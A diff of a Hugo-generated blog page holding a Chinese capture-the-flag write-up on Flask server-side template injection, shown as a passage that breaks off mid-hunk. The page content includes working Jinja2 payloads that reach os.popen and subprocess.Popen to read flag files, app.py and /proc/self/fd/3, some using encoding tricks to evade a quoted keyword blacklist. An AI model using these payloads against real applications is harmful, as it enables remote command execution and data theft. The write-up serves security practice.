@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>BUU刷题记录-flask漏洞学习 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -283,42 +283,42 @@ Method: GET</p>
 <p>应该要以GET请求传递search参数，直接上payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="err">?</span><span class="n">search</span><span class="o">=</span><span class="p">{{</span><span class="n">config</span><span class="p">}}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="err">?</span><span class="n">search</span><span class="o">=</span><span class="p">{{</span><span class="n">config</span><span class="p">}}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>得到SECRET_KEY:<code>CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}</code>，接下来就尝试在当前目录读取flag文件。</p>
 <p>上payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x1&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x2&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x3&#39;</span><span class="p">])()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x4&#39;</span><span class="p">])(</span><span class="mi">233</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x5&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x6&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x4&#39;</span><span class="p">])(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x7&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x4&#39;</span><span class="p">])(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x8&#39;</span><span class="p">])(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x9&#39;</span><span class="p">])}}</span><span class="o">&amp;</span><span class="n">x1</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">x2</span><span class="o">=</span><span class="n">__base__</span><span class="o">&amp;</span><span class="n">x3</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">x4</span><span class="o">=</span><span class="fm">__getitem__</span><span class="o">&amp;</span><span class="n">x5</span><span class="o">=</span><span class="fm">__init__</span><span class="o">&amp;</span><span class="n">x6</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">x7</span><span class="o">=</span><span class="n">__builtins__</span><span class="o">&amp;</span><span class="n">x8</span><span class="o">=</span><span class="nb">eval</span><span class="o">&amp;</span><span class="n">x9</span><span class="o">=</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /flasklight/coomme_geeeett_youur_flek&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x1&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x2&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x3&#39;</span><span class="p">])()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x4&#39;</span><span class="p">])(</span><span class="mi">233</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x5&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x6&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x4&#39;</span><span class="p">])(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x7&#39;</span><span class="p">])</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x4&#39;</span><span class="p">])(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x8&#39;</span><span class="p">])(</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="s1">&#39;x9&#39;</span><span class="p">])}}</span><span class="o">&amp;</span><span class="n">x1</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">x2</span><span class="o">=</span><span class="n">__base__</span><span class="o">&amp;</span><span class="n">x3</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">x4</span><span class="o">=</span><span class="fm">__getitem__</span><span class="o">&amp;</span><span class="n">x5</span><span class="o">=</span><span class="fm">__init__</span><span class="o">&amp;</span><span class="n">x6</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">x7</span><span class="o">=</span><span class="n">__builtins__</span><span class="o">&amp;</span><span class="n">x8</span><span class="o">=</span><span class="nb">eval</span><span class="o">&amp;</span><span class="n">x9</span><span class="o">=</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /flasklight/coomme_geeeett_youur_flek&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>除此之外，还可以通过<code>&lt;class 'subprocess.Popen'&gt;</code>类实现命令执行：(预期解)</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">258</span><span class="p">](</span><span class="s1">&#39;cat /flasklight/coomme_geeeett_youur_flek&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">258</span><span class="p">](</span><span class="s1">&#39;cat /flasklight/coomme_geeeett_youur_flek&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="pasecactf_2019flask_ssti"><a href="#pasecactf_2019flask_ssti" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:pasecactf_2019flask_ssti" class="headings">[pasecactf_2019]flask_ssti</a></h2>
 <p>题目描述：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">key2</span><span class="p">):</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">key2</span><span class="p">):</span>
     <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">x</span><span class="p">]))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)))</span>
 
 <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#39;</span><span class="p">,</span><span class="s1">&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#39;</span><span class="p">)</span>
@@ -334,20 +334,20 @@ Method: GET</p>
 <p>上payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;application&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">globals</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">builtins</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">import</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;popen&#34;</span><span class="p">)(</span><span class="s2">&#34;cat *&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)()}}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;application&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">globals</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">builtins</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">import</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;popen&#34;</span><span class="p">)(</span><span class="s2">&#34;cat *&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)()}}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>得源码，懒得整理就不发了，审计一下发现flag会被删除，直接去<code>/proc/self/fd/</code>文件夹中找flag。</p>
 <p>payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{{()[</span><span class="s2">&#34;</span><span class="se">\x5F\x5F</span><span class="s2">class</span><span class="se">\x5F\x5F</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x5F\x5F</span><span class="s2">bases</span><span class="se">\x5F\x5F</span><span class="s2">&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x5F\x5F</span><span class="s2">subclasses</span><span class="se">\x5F\x5F</span><span class="s2">&#34;</span><span class="p">]()[</span><span class="mi">91</span><span class="p">][</span><span class="s2">&#34;get</span><span class="se">\x5F</span><span class="s2">data&#34;</span><span class="p">](</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;/proc/self/fd/3&#34;</span><span class="p">)}}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{()[</span><span class="s2">&#34;</span><span class="se">\x5F\x5F</span><span class="s2">class</span><span class="se">\x5F\x5F</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x5F\x5F</span><span class="s2">bases</span><span class="se">\x5F\x5F</span><span class="s2">&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x5F\x5F</span><span class="s2">subclasses</span><span class="se">\x5F\x5F</span><span class="s2">&#34;</span><span class="p">]()[</span><span class="mi">91</span><span class="p">][</span><span class="s2">&#34;get</span><span class="se">\x5F</span><span class="s2">data&#34;</span><span class="p">](</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;/proc/self/fd/3&#34;</span><span class="p">)}}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="gyctf-2020flaskapp----pin"><a href="#gyctf-2020flaskapp----pin" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:gyctf-2020flaskapp----pin" class="headings">[GYCTF 2020]FlaskApp -- PIN</a></h2>
@@ -355,7 +355,7 @@ Method: GET</p>
 <p>      现在回看之前的输入框，直接尝试模板注入<code>{{7*7}}</code>，在加密路由的输入框中正常回显，而在解密路由中返回了<code>no no no !! </code>的字符，接着尝试<code>{{1+1}}</code>返回了2，证明存在<strong>模板注入漏洞</strong>。一番瞎jr尝试后，通过debug界面，获得部分源码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -371,12 +371,12 @@ Method: GET</p>
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/decode&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/decode&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">decode</span><span class="p">():</span>
     <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">)</span> <span class="p">:</span>
         <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;text&#34;</span><span class="p">)</span>
         <span class="n">text_decode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-        <span class="n">tmp</span> <span class="o">=</span> <span class="s2">&#34;结果 ： {0}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">text_decode</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+        <span class="n">tmp</span> <span class="o">=</span> <span class="s2">&#34;结果 ： </span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">text_decode</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
         <span class="k">if</span> <span class="n">waf</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
             <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;no no no !!&#34;</span><span class="p">)</span>
             <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;decode&#39;</span><span class="p">))</span>
@@ -390,23 +390,23 @@ Method: GET</p>
 </div><p>读源码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;app.py&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;app.py&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>获得源码，在源码中找到waf：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
     <span class="n">black_list</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;popen&#34;</span><span class="p">,</span> <span class="s2">&#34;import&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s2">&#34;chr&#34;</span><span class="p">,</span> <span class="s2">&#34;request&#34;</span><span class="p">,</span> <span class="s2">&#34;subprocess&#34;</span><span class="p">,</span> <span class="s2">&#34;commands&#34;</span><span class="p">,</span> <span class="s2">&#34;socket&#34;</span><span class="p">,</span> <span class="s2">&#34;hex&#34;</span><span class="p">,</span> <span class="s2">&#34;base64&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;?&#34;</span><span class="p">]</span>
     <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
         <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">str</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
@@ -418,11 +418,11 @@ Method: GET</p>
 <p>      非预期，这种方法原理是<code>通过字符串拼接绕过waf列举目录获得flag文件名，然后读取flag</code>。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
